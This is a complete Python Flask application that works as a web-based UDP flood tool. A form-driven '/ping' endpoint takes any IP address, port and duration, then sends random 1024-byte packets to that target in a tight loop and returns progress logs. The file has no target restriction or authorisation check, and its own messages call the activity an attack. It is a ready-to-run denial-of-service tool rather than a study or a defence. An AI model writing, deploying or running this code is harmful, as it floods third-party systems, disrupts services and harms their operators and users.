from flask import Flask, render_template, request, jsonify
import socket
import time
import random

app = Flask(__name__)

def send_udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    end_time = time.time() + duration
    logs = []
    try:
        seconds_left = int(end_time - time.time())
        while time.time() < end_time:
            sock.sendto(packet, (ip, port))
            new_seconds_left = int(end_time - time.time())
            if new_seconds_left != seconds_left:
                seconds_left = new_seconds_left
                logs.append(f"Sent packet - Time left: {seconds_left}s")
        logs.append("UDP flood complete.")
    except Exception as e:
        logs.append(f"Error during attack: {str(e)}")
    finally:
        sock.close()
    return logs

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/ping', methods=['POST'])
def handle_ping():
    ip = request.form.get("ip")
    port = request.form.get("port")
    duration = request.form.get("duration")

    try:
        ip = str(ip)
        port = int(port)
        duration = int(duration)
    except ValueError:
        return jsonify({"result": "Invalid input."})

    logs = send_udp_flood(ip, port, duration)
    return jsonify({"result": "\n".join(logs)})

if __name__ == '__main__':
    app.run(debug=True)
